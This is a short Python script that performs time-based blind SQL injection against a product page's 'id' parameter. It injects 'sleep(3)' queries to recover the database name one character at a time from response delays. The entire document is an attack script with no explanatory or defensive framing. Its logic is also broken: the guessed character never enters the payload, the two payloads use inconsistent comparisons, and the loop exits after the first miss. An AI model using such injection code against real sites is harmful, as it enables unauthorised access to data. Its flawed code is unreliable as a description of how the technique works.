import requests
import sys

url = "https://example.com/product.php?id="

chars = "abcdefghijklmnopqrstuvwxyz0123456789_@."

database_name = ""

payload= "4 and (select sleep(3) from dual where database() binary like '{}%') -- -".format(database_name)

while True:
    for i in chars:
        res = requests.get(url+payload)
        if res.elapsed.total_seconds() >= 3:
            database_name+= i
            payload= "4 and (select sleep(3) from dual where database() like '{}%') -- -".format(database_name)
            break
        print (database_name)
        sys.exit()

